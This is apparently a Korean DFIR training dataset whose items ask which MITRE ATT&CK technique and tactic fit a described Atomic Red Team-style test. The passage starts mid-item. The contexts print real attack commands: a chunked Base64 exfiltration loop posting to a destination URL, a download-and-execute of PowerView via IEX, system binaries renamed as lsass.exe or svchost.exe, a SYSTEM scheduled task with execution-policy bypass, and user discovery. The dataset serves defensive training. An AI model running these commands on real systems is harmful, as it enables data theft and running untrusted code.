to a file\n$decryptedString | out-file T1027.013_decryptedEicar.txt", "answer": "이 행위는 MITRE ATT&CK의 T1027.013 \"Obfuscated Files or Information: Encrypted/Encoded File\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1030_T1030-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1030 Data Transfer Size Limits (Tactic: Exfiltration)\n[요약] PowerShell을 사용해 지정한 파일을 일정 크기의 청크로 나누어 읽고, 각 청크를 Base64로 인코딩한 후 HTTP POST 요청으로 전송하는 시나리오를 재현한다. 전송 단위를 잘게 나눔으로써 전송량 기반 탐지 우회를 시뮬레이션할 수 있다.\n[절차] source_file_path에 지정된 파일을 .NET FileStream(OpenRead)으로 연다. chunk_size(기본 1024KB)에 따라 바이트 배열 버퍼를 생성한다. while 루프로 파일이 끝날 때까지 버퍼 단위로 데이터를 읽는다. 읽어온 바이트를 Convert.ToBase64String으로 Base64 문자열로 인코딩한다. Invoke-WebRequest를 사용해 destination_url로 Base64 인코딩된 청크를 HTTP POST 방식으로 전송한다. 파일 스트림을 닫고 전송을 종료한다.\n[대표 명령 예시]\n$file = [System.IO.File]::OpenRead(#{source_file_path})\n$chunkSize = #{chunk_size} * 1KB\n$buffer = New-Object Byte[] $chunkSize\n  \nwhile ($bytesRead = $file.Read($buffer, 0, $buffer.Length)) {\n    $encodedChunk = [Convert]::ToBase64String($buffer, 0, $bytesRead)\n    Invoke-WebRequest -Uri #{destination_url} -Method Post -Body $encodedChunk\n}\n$file.Close()", "answer": "이 행위는 MITRE ATT&CK의 T1030 \"Data Transfer Size Limits\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Exfiltration이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1033_T1033-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1033 System Owner/User Discovery (Tactic: Discovery)\n[요약] whoami, wmic useraccount, quser, qwinsta 등을 이용해 로컬 및 원격 컴퓨터의 사용자/세션 정보를 수집하고, 결과 일부를 computers.txt, usernames.txt 파일로 저장하는 시나리오를 재현한다.\n[절차] whoami로 현재 로그온 사용자를 확인한다. wmic useraccount get /ALL로 시스템에 존재하는 계정 정보를 조회한다. quser /SERVER와 quser로 원격 및 로컬 세션 정보를 가져온다. qwinsta.exe /server 및 qwinsta.exe로 터미널 세션 상태를 조회한다. qwinsta 결과를 파싱해 활성 세션이 있는 컴퓨터 이름을 computers.txt에 저장한다. computers.txt에 기록된 각 컴퓨터에 대해 다시 qwinsta를 실행해 사용자명을 usernames.txt에 저장한다.\n[대표 명령 예시]\ncmd.exe /C whoami\nwmic useraccount get /ALL\nquser /SERVER:\"#{computer_name}\"\nquser\nqwinsta.exe /server:#{computer_name}\nqwinsta.exe\nfor /F \"tokens=1,2\" %i in ('qwinsta /server:#{computer_name} ^| findstr \"Active Disc\"') do @echo %i ^| find /v \"#\" ^| find /v \"console\" || echo %j > computers.txt\n@FOR /F %n in (computers.txt) DO @FOR /F \"tokens=1,2\" %i in ('qwinsta /server:%n ^| findstr \"Active Disc\"') do @echo %i ^| find /v \"#\" ^| find /v \"console\" || echo %j > usernames.txt", "answer": "이 행위는 MITRE ATT&CK의 T1033 \"System Owner/User Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1033_T1033-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1033 System Owner/User Discovery (Tactic: Discovery)\n[요약] 인터넷에서 PowerView.ps1을 로드한 뒤 Invoke-UserHunter -Stealth를 사용해 현재 사용자의 세션이 존재하는 도메인 내 컴퓨터를 탐색하는 시나리오이다. 측면 이동을 위한 타깃 호스트를 찾는 단계에 해당한다.\n[절차] PowerShell에서 TLS 1.2 프로토콜을 사용하도록 SecurityProtocol을 설정한다. raw.githubusercontent.com에서 PowerView.ps1 스크립트를 다운로드해 메모리에 로드(IEX)한다. Invoke-UserHunter -Stealth -Verbose 명령을 실행해 도메인 내에서 현재 사용자 세션이 존재하는 호스트를 탐색한다. 발견된 세션과 컴퓨터 정보를 콘솔에 출력한다.\n[대표 명령 예시]\n[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nIEX (IWR 'https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/f94a5d298a1b4c5dfb1f30a246d9c73d13b22888/Recon/PowerView.ps1' -UseBasicParsing); Invoke-UserHunter -Stealth -Verbose", "answer": "이 행위는 MITRE ATT&CK의 T1033 \"System Owner/User Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1033_T1033-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1033 System Owner/User Discovery (Tactic: Discovery)\n[요약] PowerShell 환경 변수와 .NET API를 이용해 현재 로그인된 사용자 이름을 조회하고, 결과를 CurrentactiveUser.txt 파일에 기록하는 간단한 사용자 식별 시나리오이다.\n[절차] [System.Environment]::UserName을 사용해 현재 사용자 이름을 가져온다. 해당 값을 .\\\\CurrentactiveUser.txt 파일로 출력한다. $env:UserName 환경 변수를 사용해 동일한 정보를 다시 가져와 같은 파일에 Append 한다. 결과 파일을 통해 현재 활성 사용자 계정을 확인한다.\n[대표 명령 예시]\n[System.Environment]::UserName | Out-File -FilePath .\\CurrentactiveUser.txt \n$env:UserName | Out-File -FilePath .\\CurrentactiveUser.txt -Append", "answer": "이 행위는 MITRE ATT&CK의 T1033 \"System Owner/User Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1033_T1033-4_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1033 System Owner/User Discovery (Tactic: Discovery)\n[요약] WindowsIdentity .NET 클래스의 GetCurrent 메서드를 사용해 현재 보안 컨텍스트의 Windows 사용자 정보를 가져오고, 결과 객체를 CurrentUserObject.txt에 저장하는 테스트이다.\n[절차] PowerShell에서 [System.Security.Principal.WindowsIdentity]::GetCurrent() 호출로 현재 사용자 토큰 정보를 얻는다. 해당 객체의 문자열 표현을 .\\\\CurrentUserObject.txt 파일로 출력한다. 파일을 통해 SID, 인증 유형 등 보다 상세한 사용자 정보를 확인할 수 있다.\n[대표 명령 예시]\n[System.Security.Principal.WindowsIdentity]::GetCurrent() | Out-File -FilePath .\\CurrentUserObject.txt", "answer": "이 행위는 MITRE ATT&CK의 T1033 \"System Owner/User Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1033_T1033-5_Q5", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1033 System Owner/User Discovery (Tactic: Discovery)\n[요약] SocGholish 캠페인에서 관찰된 것처럼 whoami /all 출력 결과를 임시 디렉터리의 무작위 파일(radXXXXX.tmp)에 기록하는 동작을 모방한다. 파일명 패턴과 Temp 경로를 통해 탐지 포인트를 만들 수 있다.\n[절차] 대문자 알파벳과 숫자 배열을 기반으로 랜덤 토큰 세트를 생성한다. 무작위로 선택된 5글자 문자열을 만들어 rad<랜덤>.tmp 형식의 파일 이름을 만든다. whoami.exe /all 명령을 실행하고 결과를 지정된 output_path(기본 $env:temp) 내 rad*.tmp 파일에 리다이렉트한다. 나중에 cleanup 단계에서 rad*.tmp 파일을 삭제할 수 있다.\n[대표 명령 예시]\n$TokenSet = @{\n  U = [Char[]]'ABCDEFGHIJKLMNOPQRSTUVWXYZ'\n  N = [Char[]]'0123456789'\n}\n$Upper = Get-Random -Count 5 -InputObject $TokenSet.U\n$Number = Get-Random -Count 5 -InputObject $TokenSet.N\n$StringSet = $Upper + $Number\n$rad = (Get-Random -Count 5 -InputObject $StringSet) -join ''\n$file = \"rad\" + $rad + \".tmp\"\n\nwhoami.exe /all >> #{output_path}\\$file", "answer": "이 행위는 MITRE ATT&CK의 T1033 \"System Owner/User Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1033_T1033-6_Q6", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1033 System Owner/User Discovery (Tactic: Discovery)\n[요약] cmd.exe 기본 명령(환경 변수, net users, query user)을 사용해 현재 시스템의 사용자 계정, 도메인 정보, 세션 정보를 수집하고 결과를 임시 파일(user_info_*.tmp)에 저장하는 테스트이다.\n[절차] output_file_path(기본 $env:temp)에 user_info_%random%.tmp 이름의 출력 파일 경로를 구성한다. USERNAME, USERDOMAIN 환경 변수를 읽어 현재 사용자와 도메인 정보를 파일에 기록한다. net users 명령을 실행해 로컬 사용자 계정 목록을 파일에 추가한다. query user 명령으로 현재 세션 정보를 파일에 추가 기록한다. cleanup 단계에서 user_info_*.tmp 파일을 삭제할 수 있다.\n[대표 명령 예시]\nset file=#{output_file_path}\\user_info_%random%.tmp\necho Username: %USERNAME% > %file%\necho User Domain: %USERDOMAIN% >> %file%\nnet users >> %file%\nquery user >> %file%", "answer": "이 행위는 MITRE ATT&CK의 T1033 \"System Owner/User Discovery\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Discovery이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1036_T1036-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1036 Masquerading (Tactic: Defense Evasion)\n[요약] System32에 존재하는 cmd.exe를 All Users 프로필 디렉터리(예: C:\\\\ProgramData)에 복사한 뒤, 비정상 경로에서 cmd.exe를 실행하는 시나리오를 통해 \"시스템 파일이 비표준 경로에서 실행\"되는 위장(Masquerading) 행위를 모방한다.\n[절차] 원본 시스템 파일인 %WINDIR%\\\\System32\\\\cmd.exe를 %ALLUSERSPROFILE% 루트 디렉터리로 복사한다. 복사된 %ALLUSERSPROFILE%\\\\cmd.exe를 Start-Process로 실행한다. 일정 시간(sleep 5초) 대기 후, 실행된 cmd 프로세스를 종료한다. 이 과정에서 시스템 파일이 비정상적인 경로에서 실행되었다는 흔적이 남는다.\n[대표 명령 예시]\ncopy-item \"$env:windir\\System32\\cmd.exe\" -destination \"$env:allusersprofile\\cmd.exe\"\nstart-process \"$env:allusersprofile\\cmd.exe\"\nsleep -s 5 \nstop-process -name \"cmd\" | out-null", "answer": "이 행위는 MITRE ATT&CK의 T1036 \"Masquerading\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1036_T1036-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1036 Masquerading (Tactic: Defense Evasion)\n[요약] GitHub에서 T1036.zip을 내려받아 해제한 뒤 README.cmd를 실행하여 내부의 PDF를 DLL로 이름 변경하고 실행하는 BazaLoader 유사 기법을 재현한다. 압축 파일 속 정상 문서/스크립트처럼 보이는 요소로 악성 DLL 실행을 위장하는 시나리오이다.\n[절차] 외부에서 악성(시뮬레이션용) ZIP 파일을 PathToAtomicsFolder\\\\..\\\\ExternalPayloads\\\\T1036.zip 경로로 다운로드한다. PowerShell Expand-Archive를 사용해 ZIP을 %USERPROFILE%\\\\Downloads\\\\T1036 경로에 압축 해제한다. 작업 디렉터리를 %USERPROFILE%\\\\Downloads\\\\T1036 로 변경한다. README.cmd 파일을 cmd /c로 실행하여, 내부 로직에 따라 .pdf 파일을 .dll로 이름 변경하고 DLL을 로드·실행한다. 테스트 완료 후 Calculator.exe를 종료하고, T1036 폴더를 정리한다.\n[대표 명령 예시]\nExpand-Archive -Path \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.zip\" -DestinationPath \"$env:userprofile\\Downloads\\T1036\" -Force\ncd \"$env:userprofile\\Downloads\\T1036\"\ncmd /c \"$env:userprofile\\Downloads\\T1036\\README.cmd\" >$null 2>$null", "answer": "이 행위는 MITRE ATT&CK의 T1036 \"Masquerading\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1036.003_T1036.003-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1036.003 Masquerading: Rename System Utilities (Tactic: Defense Evasion)\n[요약] System32의 cmd.exe를 %SystemRoot%\\Temp 경로로 복사한 뒤 파일명을 lsass.exe로 변경하고 실행한다. 결과적으로 lsass.exe란 이름의 프로세스가 비표준 경로(Temp)에서 실행되는 상황을 만들어 LSASS 프로세스를 위장하는 시나리오를 재현한다.\n[절차] %SystemRoot%\\System32\\cmd.exe 파일을 %SystemRoot%\\Temp\\lsass.exe 이름으로 복사한다. 복사된 %SystemRoot%\\Temp\\lsass.exe를 /B 옵션으로 실행한다. 일정 시간이 지난 뒤 DFIR 관점에서 프로세스 목록, 이미지 경로, Prefetch 등 아티팩트를 분석해 비정상 LSASS 실행을 확인할 수 있다. cleanup 단계에서 %SystemRoot%\\Temp\\lsass.exe 파일을 삭제해 흔적을 정리한다.\n[대표 명령 예시]\ncopy %SystemRoot%\\System32\\cmd.exe %SystemRoot%\\Temp\\lsass.exe\n%SystemRoot%\\Temp\\lsass.exe /B", "answer": "이 행위는 MITRE ATT&CK의 T1036.003 \"Masquerading: Rename System Utilities\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1036.003_T1036.003-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1036.003 Masquerading: Rename System Utilities (Tactic: Defense Evasion)\n[요약] System32의 cscript.exe를 %APPDATA% 경로로 복사하면서 파일명을 notepad.exe로 변경하고 실행한다. 스크립트 호스트가 메모장(notepad.exe)으로 가장해 비표준 경로에서 동작하는 상황을 시뮬레이션한다.\n[절차] %SystemRoot%\\System32\\cscript.exe를 %APPDATA%\\notepad.exe 이름으로 복사한다. cmd.exe를 통해 %APPDATA%\\notepad.exe /B를 실행해 cscript.exe가 notepad.exe처럼 동작하도록 한다. 프로세스 목록·이미지 경로·PE 메타데이터를 통해 파일 이름과 실제 서명/설명이 불일치하는 점을 확인할 수 있다. cleanup 단계에서 %APPDATA%\\notepad.exe를 삭제한다.\n[대표 명령 예시]\ncopy %SystemRoot%\\System32\\cscript.exe %APPDATA%\\notepad.exe /Y\ncmd.exe /c %APPDATA%\\notepad.exe /B", "answer": "이 행위는 MITRE ATT&CK의 T1036.003 \"Masquerading: Rename System Utilities\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1036.003_T1036.003-3_Q3", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1036.003 Masquerading: Rename System Utilities (Tactic: Defense Evasion)\n[요약] System32의 wscript.exe를 %APPDATA%\\svchost.exe로 복사한 뒤, 외부 VBS 스크립트를 인자로 실행한다. 서비스 호스트(svchost.exe)처럼 보이지만 실제로는 wscript.exe인 프로세스를 생성해 위장 실행을 재현한다.\n[절차] 사전 단계에서 T1036.003_masquerading.vbs를 PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.003\\src 경로에 다운로드한다. %SystemRoot%\\System32\\wscript.exe를 %APPDATA%\\svchost.exe 이름으로 복사한다. cmd.exe /c %APPDATA%\\svchost.exe \"...vbs\" 명령으로 위장된 wscript 프로세스를 실행한다. 실행 중 프로세스 이름(svchost.exe), 이미지 경로(%APPDATA%), 원본 PE 메타데이터(마이크로소프트 서명 wscript.exe) 간 불일치를 분석할 수 있다.\n[대표 명령 예시]\ncopy %SystemRoot%\\System32\\wscript.exe %APPDATA%\\svchost.exe /Y\ncmd.exe /c %APPDATA%\\svchost.exe \"PathToAtomicsFolder\\..\\ExternalPayloads\\T1036.003\\src\\T1036.003_masquerading.vbs\"", "answer": "이 행위는 MITRE ATT&CK의 T1036.003 \"Masquerading: Rename System Utilities\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1036.003_T1036.003-4_Q4", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1036.003 Masquerading: Rename System Utilities (Tactic: Defense Evasion)\n[요약] System32의 powershell.exe를 %APPDATA%\\taskhostw.exe로 복사한 뒤 cmd.exe를 통해 실행한다. 태스크 호스트(taskhostw.exe)처럼 보이는 이름과 위치를 사용하지만 실제 PE는 PowerShell인 상황을 만들어 위장을 테스트한다.\n[절차] %windir%\\System32\\WindowsPowerShell\\v1.0\\powershell.exe를 %APPDATA%\\taskhostw.exe로 복사한다. cmd.exe /K %APPDATA%\\taskhostw.exe 명령으로 위장된 PowerShell 프로세스를 실행한다. 이후 프로세스 목록, 이미지 경로, 커맨드라인을 조사하여 정식 taskhostw.exe(보통 System32)와의 위치 차이를 확인한다. cleanup 단계에서 %APPDATA%\\taskhostw.exe를 제거한다.\n[대표 명령 예시]\ncopy %windir%\\System32\\windowspowershell\\v1.0\\powershell.exe %APPDATA%\\taskhostw.exe /Y\ncmd.exe /K %APPDATA%\\taskhostw.exe", "answer": "이 행위는 MITRE ATT&CK의 T1036.003 \"Masquerading: Rename System Utilities\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1036.003_T1036.003-5_Q5", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1036.003 Masquerading: Rename System Utilities (Tactic: Defense Evasion)\n[요약] 임의의 exe(비 Windows 기본 파일)를 복사해 svchost.exe라는 이름과 TEMP 경로로 배치하고 실행한 뒤 바로 종료한다. 비표준 svchost.exe가 사용자 TEMP 디렉터리에서 실행되는 상황을 만들어 악성 페이로드가 시스템 프로세스를 가장하는 케이스를 모사한다.\n[절차] 기본적으로 PathToAtomicsFolder\\T1036.003\\bin\\T1036.003.exe를 입력 파일로 사용한다. PowerShell에서 copy \"#{inputfile}\" #{outputfile} 명령으로 exe를 #{outputfile} (기본: %TEMP%\\svchost.exe) 경로에 복사한다. Start-Process -PassThru -FilePath #{outputfile}로 위장된 svchost.exe를 실행하고, 프로세스 ID를 획득한다. 테스트 직후 Stop-Process -ID 로 프로세스를 종료해 짧게 실행된 위장 svchost.exe를 남긴다.\n[대표 명령 예시]\ncopy \"#{inputfile}\" #{outputfile}\ntry { $myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id }\ncatch { $_; exit $_.Exception.HResult}\nStop-Process -ID $myT1036_003", "answer": "이 행위는 MITRE ATT&CK의 T1036.003 \"Masquerading: Rename System Utilities\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1036.003_T1036.003-6_Q6", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1036.003 Masquerading: Rename System Utilities (Tactic: Defense Evasion)\n[요약] 환경 변수 %ComSpec%(일반적으로 cmd.exe)를 복사해 svchost.exe라는 이름으로 TEMP 디렉터리에 저장하고 실행한 뒤 종료한다. 정상 Windows 실행 파일을 다른 시스템 프로세스 이름으로 위장하는 패턴을 재현한다.\n[절차] 입력 파일로 $env:ComSpec (대부분 C:\\Windows\\System32\\cmd.exe)을 사용한다. PowerShell에서 copy \"#{inputfile}\" #{outputfile} 명령으로 exe를 #{outputfile}(기본: %TEMP%\\svchost.exe)로 복사한다. Start-Process -PassThru -FilePath #{outputfile}로 TEMP\\svchost.exe를 실행하고, 프로세스 ID를 저장한다. Stop-Process -ID 를 사용해 프로세스를 즉시 종료하면서도, 짧게 실행된 위장 svchost.exe 흔적(로그, Prefetch 등)을 남긴다.\n[대표 명령 예시]\ncopy \"#{inputfile}\" #{outputfile}\n$myT1036_003 = (Start-Process -PassThru -FilePath #{outputfile}).Id\nStop-Process -ID $myT1036_003", "answer": "이 행위는 MITRE ATT&CK의 T1036.003 \"Masquerading: Rename System Utilities\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1036.003_T1036.003-7_Q7", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1036.003 Masquerading: Rename System Utilities (Tactic: Defense Evasion)\n[요약] System32의 cmd.exe를 C:\\lsm.exe라는 이름으로 루트 디렉터리에 복사하고, C:\\T1036.003.txt 파일을 생성하는 명령을 실행한다. LSM(Local Session Manager) 시스템 서비스처럼 보이는 프로세스/파일을 비표준 경로와 잘못된 계정으로 실행하는 사례를 모사한다.\n[절차] C:\\Windows\\System32\\cmd.exe를 C:\\lsm.exe 이름으로 복사한다. C:\\lsm.exe /c echo T1036.003 > C:\\T1036.003.txt 명령을 실행해 텍스트 파일을 생성한다. DFIR 관점에서 C:\\lsm.exe의 경로, 파일 서명, 실행 계정을 점검해 정상 LSM 서비스(보통 %SystemRoot%\\System32\\lsm.exe, Local System 계정)와의 차이를 비교할 수 있다. cleanup 단계에서 C:\\T1036.003.txt와 C:\\lsm.exe를 삭제하여 환경을 원복한다.\n[대표 명령 예시]\ncopy C:\\Windows\\System32\\cmd.exe C:\\lsm.exe\nC:\\lsm.exe /c echo T1036.003 > C:\\T1036.003.txt", "answer": "이 행위는 MITRE ATT&CK의 T1036.003 \"Masquerading: Rename System Utilities\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1036.004_T1036.004-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1036.004 Masquerading: Masquerade Task or Service (Tactic: Defense Evasion)\n[요약] schtasks 명령을 사용해 실제 W32Time 서비스와 유사한 이름(win32times)의 스케줄러 태스크를 생성한다. 태스크는 SYSTEM 계정으로 매일 실행되며, 존재하지 않는 PowerShell 스크립트를 호출하도록 설정되어 위장된 태스크 기반 지속성 시나리오를 모사한다.\n[절차] schtasks /create 명령으로 /tn win32times 이름의 새 스케줄러 태스크를 생성한다. 태스크는 /ru system 으로 SYSTEM 계정, /sc daily로 매일 주기 실행, /tr \"cmd /c powershell.exe -ep bypass -file c:\\T1036.004_NonExistingScript.ps1\" 명령을 수행하도록 설정한다. schtasks /query /tn win32times 를 통해 태스크가 정상적으로 등록되었는지 확인한다. cleanup 단계에서 schtasks /tn win32times /delete /f 명령으로 해당 태스크를 제거한다.\n[대표 명령 예시]\nschtasks /create /ru system /sc daily /tr \"cmd /c powershell.exe -ep bypass -file c:\\T1036.004_NonExistingScript.ps1\" /tn win32times /f\nschtasks /query /tn win32times", "answer": "이 행위는 MITRE ATT&CK의 T1036.004 \"Masquerading: Masquerade Task or Service\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1036.004_T1036.004-2_Q2", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1036.004 Masquerading: Masquerade Task or Service (Tactic: Defense Evasion)\n[요약] sc 명령을 이용해 실제 W32Time 서비스와 유사한 이름(win32times)의 Windows 서비스를 생성한다. 서비스 binPath는 cmd /c start c:\\T1036.004_NonExistingScript.ps1 로 설정되어, 마치 정상 시간 서비스처럼 보이는 위장된 사용자 정의 서비스를 재현한다.\n[절차] sc create win32times binPath= \"cmd /c start c:\\T1036.004_NonExistingScript.ps1\" 명령으로 새 서비스를 생성한다. sc qc win32times 를 실행해 서비스 구성이 어떻게 등록되었는지 확인한다. 서비스는 실제 W32Time(Windows Time)과 유사한 이름(win32times)을 사용해, 관리 콘솔이나 로그에서 혼동을 유발할 수 있다. cleanup 단계에서 sc delete win32times 명령으로 서비스를 제거한다.\n[대표 명령 예시]\nsc create win32times binPath= \"cmd /c start c:\\T1036.004_NonExistingScript.ps1\"\nsc qc win32times", "answer": "이 행위는 MITRE ATT&CK의 T1036.004 \"Masquerading: Masquerade Task or Service\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
{"id": "T1036.005_T1036.005-1_Q1", "question": "다음과 같은 행위 로그가 포착되었다. 포렌식/DFIR 관점에서 이 행위를 MITRE ATT&CK의 어떤 기법(T-ID)과 전술(tactic)으로 태깅해야 할까?", "context": "[Technique] T1036.005 Masquerading: Match Legitimate Name or Location (Tactic: Defense Evasion)\n[요약] PowerShell Add-Type를 이용해 간단한 C# 프로그램을 컴파일하고, 출력 파일명을 svchost.exe와 같이 정상 시스템 유틸리티 이름으로 지정한다. 이후 해당 파일을 실행해, Temp 경로에 위치한 가짜 svchost.exe 프로세스가 떠 있는 상황을 재현한다.\n[절차] PowerShell Add-Type -TypeDefinition을 사용해 콘솔에 \"tweet, tweet\" 문자열을 출력하는 단순 C# Main 함수를 정의한다. Add-Type 호출 시 -OutputAssembly 파라미터를 이용해 출력 경로를 #{executable_filepath} (기본: %windir%\\Temp\\svchost.exe)로 지정해 컴파일한다. Start-Process -FilePath \"#{executable_filepath}\" 명령으로 Temp 폴더의 svchost.exe를 실행한다. cleanup 단계에서 Remove-Item -Path \"#{executable_filepath}\"로 생성된 가짜 svchost.exe 파일을 삭제한다.\n[대표 명령 예시]\nAdd-Type -TypeDefinition @'\n      public class Test {\n          public static void Main(string[] args) {\n              System.Console.WriteLine(\"tweet, tweet\");\n          }\n      }\n      '@ -OutputAssembly \"#{executable_filepath}\"\n\n      Start-Process -FilePath \"#{executable_filepath}\"", "answer": "이 행위는 MITRE ATT&CK의 T1036.005 \"Masquerading: Match Legitimate Name or Location\" 기법으로 분류하는 것이 적절하다. 전술(tactic)은 Defense Evasion이며, 기존 태그(action/domain/ttp)에 나타난 것처럼 해당 테스트는 위 기술의 대표적인 예시로 볼 수 있다."}
